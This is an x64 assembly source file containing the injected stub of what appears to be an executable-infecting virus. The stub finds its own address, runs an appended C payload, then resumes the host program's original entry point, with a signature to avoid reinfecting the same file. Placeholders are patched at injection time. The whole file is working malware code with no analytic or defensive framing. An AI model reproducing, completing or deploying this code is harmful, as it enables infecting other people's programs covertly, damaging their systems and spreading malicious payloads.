PUBLIC __payload_start
PUBLIC code_size
PUBLIC signature
PUBLIC payload
PUBLIC to_c_code
PUBLIC delta_start

injected SEGMENT READ EXECUTE

__payload_start:

    ; Will be replaced by the size of the payload
    code_size LABEL DWORD
        DWORD ?

    ; Unique signature to identify the payload and avoid reinfection
    signature LABEL DWORD
        DWORD 0BAADC0DEh

    payload PROC
        ; int 3
        call _next  ; push rip; jmp _next
    _next:
        pop rbp     ; rbp = rip
        sub rbp, _next - payload

        mov rbx, [rbp + (to_c_code - payload)]
        add rbx, rbp
        enter 1000h, 0  ; Reserve 0x1000 bytes on the stack for the C payload
        call rbx
        leave           ; Restore the stack

        mov rbx, [rbp + (delta_start - payload)]
        add rbx, rbp
        push rbp
        call rbx
    payload ENDP

    ; Will be replaced by the offset to the C code
    to_c_code LABEL QWORD
        QWORD ?

    ; Will be replaced by the offset to the original entry point
    delta_start LABEL SQWORD
        SQWORD ?

injected ENDS

END
